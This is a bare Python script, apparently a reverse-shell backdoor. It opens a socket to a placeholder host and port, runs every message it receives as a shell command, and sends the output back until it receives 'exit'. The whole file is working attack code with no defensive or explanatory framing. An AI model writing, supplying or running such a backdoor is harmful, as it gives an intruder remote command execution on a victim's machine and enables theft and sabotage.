import os
import socket
import subprocess

HOST = 'target_ip_address'
PORT = 1234

s = socket.socket()
s.connect((HOST, PORT))

message = s.recv(1024).decode()

if 'git clone' in message:
    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = command.communicate()
    s.send(stdout + stderr)

while True:
    message = s.recv(1024).decode()
    if message.strip() == 'exit':
        break
    else:
        command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = command.communicate()
        s.send(stdout + stderr)

s.close()
